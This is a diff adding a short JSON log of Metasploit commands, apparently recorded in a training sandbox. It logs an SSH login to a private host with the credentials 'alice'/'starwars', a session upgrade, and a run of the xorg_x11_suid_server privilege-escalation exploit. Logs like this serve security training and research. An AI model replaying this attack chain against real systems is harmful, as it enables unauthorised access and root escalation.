@@ -1,0 +1,11 @@
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:45:17.624846Z", "cmd_type": "msf-command", "cmd": "use auxiliary/scanner/ssh/ssh_o"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:45:21.967208Z", "cmd_type": "msf-command", "cmd": "use auxiliary/scanner/ssh/ssh_login"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:45:45.096493Z", "cmd_type": "msf-command", "cmd": "set rhosts 172.18.1.5"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:45:49.933042Z", "cmd_type": "msf-command", "cmd": "set username alice"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:45:54.670678Z", "cmd_type": "msf-command", "cmd": "set password starwars"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:46:09.508467Z", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:46:37.949854Z", "cmd_type": "msf-command", "cmd": "sessions -u 2"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:46:52.131250Z", "cmd_type": "msf-command", "cmd": "use exploit/multi/local/xorg_x11_suid_server "}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:46:58.472124Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:47:07.649206Z", "cmd_type": "msf-command", "cmd": "set session 3"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T15:47:11.538084Z", "cmd_type": "msf-command", "cmd": "run"}
